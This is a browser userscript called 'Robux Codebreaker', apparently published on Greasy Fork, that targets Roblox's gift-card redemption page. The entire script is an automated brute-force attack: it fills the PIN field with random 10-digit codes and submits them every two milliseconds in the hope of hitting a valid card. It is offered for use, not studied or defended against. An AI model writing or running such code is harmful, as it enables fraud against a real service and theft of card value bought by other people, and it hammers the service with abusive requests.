// ==UserScript==
// @name         Robux Codebreaker
// @namespace    https://greasyfork.org/en
// @version      0.1 ALPHA (licensed)
// @description  Go to buy 400 robux, click enter code, and just watch.
// @author       HackmasterDMDTM
// @match        https://web.roblox.com/upgrades/redeem?ap=42&pm=redeemCard&selectedUpsellProductId=0
// @grant        none
// @license      Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)
// @downloadURL https://update.greasyfork.org/scripts/391925/Robux%20Codebreaker.user.js
// @updateURL https://update.greasyfork.org/scripts/391925/Robux%20Codebreaker.meta.js
// ==/UserScript==

(function() {
    'use strict';

    alert("Click the button to start the Codebreaker. Thank you for using the Robux Codebreaker!");
var nums = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0];

function main() {
var key = ((nums[Math.floor(Math.random() * nums.length)].toString()) + (Math.floor((Math.random() * 10)).toString()) + (Math.floor((Math.random() * 10)).toString()));
var key2 = ((Math.floor((Math.random() * 10)).toString()) + (Math.floor((Math.random() * 10)).toString()) + (Math.floor((Math.random() * 10)).toString()));
var key3 = ((Math.floor((Math.random() * 10)).toString()) + (Math.floor((Math.random() * 10)).toString()) + (Math.floor((Math.random() * 10)).toString()) + (Math.floor((Math.random() * 10)).toString()));
var code = (key + " " + key2 + " " + key3);
document.getElementById("pin").value = code;
Roblox.GameCard.redeemCode(true)
}
setInterval(function() {
main();
}, 2);
})();